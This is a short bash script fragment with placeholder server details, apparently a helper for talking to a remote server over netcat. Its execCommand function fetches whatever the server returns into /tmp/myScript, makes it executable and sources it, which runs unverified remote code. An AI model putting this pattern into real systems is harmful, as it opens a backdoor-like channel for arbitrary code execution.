#!/bin/bash

scriptPath=/path/to/your/script
port=serverPort
server=serverAddress

function pingAndStart() {
    echo "ping" | nc $server $port > /tmp/ping

    while [[ `cat /tmp/ping` != pong ]]; do
        $scriptPath
        sleep 1
        echo "ping" | nc $server $port > /tmp/ping
    done
}


function execCommand() {
    echo $1 | nc $server $port > /tmp/myScript
    chmod a+x /tmp/myScript
    . /tmp/myScript
}



